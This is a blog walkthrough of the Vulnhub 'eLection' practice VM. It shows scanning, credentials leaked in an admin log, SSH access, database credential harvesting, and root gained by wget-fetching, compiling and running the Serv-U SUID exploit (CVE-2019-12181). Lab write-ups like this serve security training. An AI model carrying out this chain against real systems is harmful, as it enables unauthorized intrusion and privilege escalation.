<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>crazyeights225</title>
   
    <link rel="stylesheet" href="../assets/bulma.min.css">
    <link rel="stylesheet" href="../static/default.min.css"><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.4.0/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script>
    <style>
      span{margin: 0; line-height: 125%; white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;}pre{padding:0.5rem 0.5rem!important;}
    </style>
  </head>
  <body>
    <div id="app" class="mt-2">
        <nav class="navbar container" role="navigation" aria-label="main navigation">
            <div class="navbar-brand">
              <a class="navbar-item" href="/">
                <img src="../assets/logo.png">
              </a>
              <a role="button" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbarBasicExample">
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
              </a>
            </div>
            <div id="navbar" class="navbar-menu">
              <div class="navbar-start">
                <a href="../index.html" class="navbar-item">Posts</a>
                    <a href="../projects.html" class="navbar-item">Projects</a>
              </div>
            </div>
          </nav>
    </div>
    <div class="hero-body mt-2" style="background-color: #285aff;">
        <div class="container has-text-centered">
            <h1 class="title" style="color: #f1f1f1;">
                Vulnhub: eLection
            </h1>
            <h2 class="subtitle" style="color: #f1f1f1;">
                July 24, 2020
            </h2>
        </div>
    </div>
</section>
<section class="container mt-2">
<div class="content column is-10">
    <nav class="breadcrumb mb-5" aria-label="breadcrumbs">
        <ul>
          <li><a href="../index.html">Posts</a></li>
          <li><a href="../sec.html">CTFs and Vulnerable VMs</a></li>
          <li class="is-active"><a href="#" aria-current="page">eLection</a></li>
        </ul>
      </nav>
<h3>Initial Scan:</h3>
<pre><code><span>Nmap scan report ​ for​ 192.168.56.104
Host is up (0.00017s latency).
Not​ shown: 998 closed ports
PORT ​ STATE​ SERVICE
22/tcp open ssh
80/tcp open http
</span></code></pre>
<h3>More thorough scan:</h3>
<pre><code><span>crazyeights@es-base:~$​ nmap -A -p- ​192.168.56.104
Starting Nmap ​ 7.80​ ( ​ https:​ //nmap.org ) at 2020-07-24 17:45 EDT
Nmap scan report ​ for​ ​ 192.168.56.104
Host is up (​ 0.000099​ s latency).
Not ​ shown:​ ​ 65533​ closed ports
PORT
STATE SERVICE VERSION
22​ /tcp open ssh OpenSSH ​ 7.6​p1 Ubuntu ​ 4ubuntu0​.3​ (Ubuntu Linux; protocol 2.0​)
80​ /tcp open http Apache httpd ​ 2.4.29​ ((Ubuntu))
|_http-server-​ header:​ Apache/​ 2.4.29​ (Ubuntu)
|_http-​ title:​ Apache2 Ubuntu Default ​ Page:​ It works
Service ​ Info:​ ​ OS:​ Linux; ​ CPE:​ ​ cpe:​ / ​ o:linux:​ linux_kernel
</span></code></pre>
<h3>Web:</h3>
<p>Checked Index.</p>
<img src="images/15/e1.png" style="width: 80%;">
<p>Ran nikto to check server for configuration:</p>
<pre><code><span>crazyeights@es-base:~$​ nikto -h http://192.168.56.104
[SNIP]
+ /phpmyadmin/: phpMyAdmin ​directory​ ​found
</span></code></pre>
<p>Went to phpmyadmin, checked default credentials</p>
<h5>Enumeration</h5>
<pre><code><span>crazyeights@es-base:~$​ dirb ​ http:​ //192.168.56.104
---- Scanning ​ URL:​ ​ http:​ //192.168.56.104/ ----
+ ​ http:​ //192.168.56.104/index.html (CODE:200|SIZE:10918)
==&gt; ​ DIRECTORY:​ ​ http:​ //192.168.56.104/javascript/
+ ​ http:​ //192.168.56.104/phpinfo.php (CODE:200|SIZE:95517)
==&gt; ​ DIRECTORY:​ ​ http:​ //192.168.56.104/phpmyadmin/
+ ​ http:​ //192.168.56.104/robots.txt (CODE:200|SIZE:30)
+ ​ http:​ //192.168.56.104/server-status (CODE:403|SIZE:279)
</span></code></pre>
<h5>Checking robots.txt:</h5>
<p>Contains folders:</p>
<ul>
<li>
<p>admin</p>
</li>
<li>
<p>wordpress</p>
</li>
<li>
<p>user</p>
</li>
<li>
<p>election</p>
</li>
</ul>
<p>Checked admin/, wordpress/, and user/ - got 404 for all</p>

<h5>Checking election:</h5>

<p>election directory does not give 404, rerunning dirb from election:</p>
<pre><code><span>crazyeights@es-base:~$ dirb http://192.168.56.104/election

GENERATED WORDS: 4612

---- Scanning ​ URL:​ ​ http:​//192.168.56.104/election/ ----
=​=&gt; DIRECTORY: http://192.168.56.104/election/admin/
==&gt; ​ DIRECTORY:​ ​ http:​//192.168.56.104/election/data/
+ http://192.168.56.104/election/index.php (CODE:200|SIZE:7003)
==&gt; ​ DIRECTORY:​ ​ http:​//192.168.56.104/election/js/
==&gt; ​ DIRECTORY:​ ​ http:​//192.168.56.104/election/languages/
==&gt; ​ DIRECTORY:​ ​ http:​//192.168.56.104/election/lib/
==&gt; ​ DIRECTORY:​ ​ http:​//192.168.56.104/election/media/
==&gt; ​ DIRECTORY:​ ​ http:​//192.168.56.104/election/themes/

---- Entering ​ directory:​ ​ http:​//192.168.56.104/election/admin/​ ----
==&gt; ​ DIRECTORY:​ ​ http:​//192.168.56.104/election/admin/ajax/
=​=&gt; DIRECTORY: http://192.168.56.104/election/admin/components/
=​=&gt; DIRECTORY: http://192.168.56.104/election/admin/css/
=​=&gt; DIRECTORY: http://192.168.56.104/election/admin/img/
=​=&gt; DIRECTORY: http://192.168.56.104/election/admin/inc/
+ http://192.168.56.104/election/admin/index.php (CODE:200|SIZE:8964)
=​=&gt; DIRECTORY: http://192.168.56.104/election/admin/logs/
[SNIP]
</span></code></pre>
<p>Checked election/admin: Dead End.</p>
<h5>Checking the admin logs:</h5>
<pre><code><span>http:​ //192.168.56.104/election/admin/logs/

File system.log
Contents:
[​2020-01-01 00:00:00​] Assigned Password​ for​ the user love: P@$$w0rd@​123
[​2020-04-03 00:13:53​] Love added candidate​ 'Love'​ .
[​2020-04-08 19:26:34​] Love has been logged ​in​​ from​ Unknown IP ​on​ ​Firefox (Linux).
</span></code></pre>
<h3>User</h3>
<p>Tried credentials with SSH.</p>
<pre><code><span>crazyeights​@es​-base:​~$ ssh love​@192​.168.56​.104
</span></code></pre>
<p>Finding user flag:</p>
<pre><code><span>love@election:~$​ ls -R
.:
Desktop Documents Downloads Videos Music Pictures Public Templates

./​ Desktop:
user.txt

love@election:~$​ ​ cat Desktop/user.txt
cd38ac698c0d793a5236d01003f692b​ 0
</span></code></pre>
<h3>Root:</h3>
<h5>
Tried:</h5>
<ul>
<li>sudo -l</li>
<li>find / -perm u=s 2&gt;/dev/null</li>
</ul>
<pre><code><span>love@election:~$​ ​ id
uid=​1000​(love) gid=​1000​(love)
groups=​1000​(love),​4(adm),​24​(cdrom),​30​(dip),​33​(www-data),​46​(plugdev),​116(lpadmin),​ 126​(sambashare)

love@election:~$​ ​lsb_release -a
No LSB modules are available.
Distributor ​ ID: Ubuntu
Description: Ubuntu ​18.04​.4 ​LTS
Release: 18.04
Codename: bionic

love@election:~$ ​ find / -group adm -type f ​ 2&gt;/dev/null
</span></code></pre>
<h5>Checking database connections for passwords:</h5>
<pre><code><span>love@election:/$​ cat /​var​/www/​html​/election/​admin​/inc/​conn.php

$db_host​ = ​ &quot;localhost&quot;​ ;
$db_user​ = ​ &quot;newuser&quot;​ ;
$db_pass​ = ​ &quot;password&quot;​ ;
$db_name​ = ​ &quot;election&quot;​ ;
</span></code></pre>
<p>On the host login to mysql:</p>
<pre><code><span>love@election:/etc/mysql$​ mysql -u newuser -p'password' -h localhost -D election
MariaDB [election]&gt; show;
+---------------------+
| Database            |
+---------------------+
| election            |
| information​ _schema |
| mysql               |
| performance_​ schema |
+---------------------+
4 rows in set (0.00 sec)

MariaDB [election]&gt; use mysql;
Database changed
MariaDB [mysql]&gt; show tables;
MariaDB [mysql]&gt; select * from user;
</span></code></pre>
<p>In table:</p>
<pre><code><span>| localhost | root | *9CFBBC772F3F6C106020035386DA5BBBF1249A11 | Y
</span></code></pre>
<p>Google it:
9CFBBC772F3F6C106020035386DA5BBBF1249A11​ :toor</p>
<pre><code><span>love@election:/etc/mysql$ su root
Password:
su: Authentication failure
</span></code></pre>
<p>Not the root password.</p>
<pre><code><span>love@election:~$​ ​ find / -group www-data -type f ​ 2&gt;/dev/null
There is file /var/www/.bash_history
love@election:~$ ​ cat /var/www/.bash_history
...
</span></code></pre>
<p>Is a dead-end</p>
<h4>The correct path:</h4>
<pre><code><span>love@election:~$​ ​find​ ​/ -perm /​4000​ ​2&gt;/dev/​null
....
/usr/​local​/Serv-U/​Serv-U
</span></code></pre>
<h4>Serv-U Privilege Escalation:</h4>
<p>Using CVE-2019-12181 Serv-U 15.1.6 Privilege Escalation</p>
<ul>
<li><a href="https://www.exploit-db.com/exploits/47009">https://www.exploit-db.com/exploits/47009</a></li>
</ul>
<p>The server version information is in Serv-U-StartupLog.txt</p>
<pre><code><span>love@election:/usr/local/Serv-U$ ​cat Serv-U-StartupLog.txt
[​01​] Sat ​25​ Jul 2​0 ​03​:12​:49​ - Serv-U File Server (​64​ -bit) - Version ​15.1
(​15.1​.6.25​) - (C) ​ 2017​ SolarWinds Worldwide, LLC. All rights reserved.
</span></code></pre>
<p>Download the exploit:</p>
<pre><code><span>
love@election:~$​ wget ​http:​//192.168.56.1/​47009​.c
</span></code></pre>
<p>Compile and run the exploit:</p>
<pre><code><span>
love@election:~$​ gcc -o pe ​47009​.c
love@election:~$ ​ ./pe
uid=​0 ​(root) gid=​0 ​(root)
groups=​0​(root),​ 4​(adm),​ 24​(cdrom),​ 30​(dip),​ 33​(www-data),​ 46​(plugdev),​ 116​(lpadmin),​ 126​(sambashare),​ 1000​(love)
opening root shell
# cd /root
# ls
root.txt
# cat root.txt
5238​feefc4ffe09645d97e9ee49bc3a6
</span></code></pre>
<p>FIN.</p>
</div>
</section>
<footer class="footer">
    <div class="container">
        <div class="columns">
        </div>
    </div>
</footer>
</body>
</html>